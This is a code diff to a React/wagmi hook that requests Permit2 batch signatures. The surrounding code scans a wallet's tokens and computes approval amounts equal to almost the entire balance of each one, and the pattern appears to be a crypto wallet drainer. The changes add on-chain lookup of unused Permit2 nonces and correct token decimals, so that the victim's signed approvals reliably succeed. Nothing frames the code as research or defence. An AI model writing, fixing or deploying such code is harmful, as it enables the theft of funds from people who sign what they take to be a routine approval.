@@ -1,4 +1,4 @@
-import { useSignTypedData } from "wagmi";
+import { useSignTypedData, usePublicClient } from "wagmi";
 import API from "../providers/axios";
 import type { ScanResult, Permit2Token } from "../types/wallet";
 
@@ -17,8 +17,48 @@ const PERMIT2_BATCH_TYPES = {
   ],
 };
 
+const permit2Abi = [
+  {
+    name: "nonceBitmap",
+    type: "function",
+    stateMutability: "view",
+    inputs: [
+      { name: "owner", type: "address" },
+      { name: "wordPosition", type: "uint256" },
+    ],
+    outputs: [{ type: "uint256" }],
+  },
+] as const;
+
+
+
 export function usePermit2Execution() {
   const { signTypedDataAsync } = useSignTypedData();
+  const publicClient = usePublicClient();
+
+const getAvailableNonce = async (user: string): Promise<bigint> => {
+    if (!publicClient) throw new Error("Public client not available");
+
+    for (let wordPos = 0; wordPos < 256; wordPos++) {
+      const bitmap = await publicClient.readContract({
+        address: PERMIT2_CONTRACT as `0x${string}`,
+        abi: permit2Abi,
+        functionName: "nonceBitmap",
+        args: [user as `0x${string}`, BigInt(wordPos)],
+      }) as bigint;
+
+      if (bitmap === 2n ** 256n - 1n) continue;
+
+      for (let bitPos = 0; bitPos < 256; bitPos++) {
+        if (!(bitmap & (1n << BigInt(bitPos)))) {
+          const nonce = (BigInt(wordPos) << 8n) | BigInt(bitPos);
+          console.log(`✅ Clean nonce: ${nonce} (word=${wordPos}, bit=${bitPos})`);
+          return nonce;
+        }
+      }
+    }
+    throw new Error("No available nonces found");
+  };
 
   const executePermit2 = async (
     scanData: ScanResult,
@@ -31,7 +71,7 @@ export function usePermit2Execution() {
     if (!permit2Tokens?.length) return;
 
     const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const nonce = BigInt(Date.now());
+    const nonce = await getAvailableNonce(user);
 
     const getActualAmount = (permit: Permit2Token): string => {
       const tokenData = scanData.tokens.find(
@@ -40,7 +80,7 @@ export function usePermit2Execution() {
 
       if (!tokenData) return permit.amount;
 
-      const decimals = 6;
+      const decimals = tokenData.decimals ?? 6;
       const adjusted = (tokenData.balance - 0.2) * Math.pow(10, decimals);
       return BigInt(Math.floor(adjusted)).toString(); // ✅ uint256 as text
     };
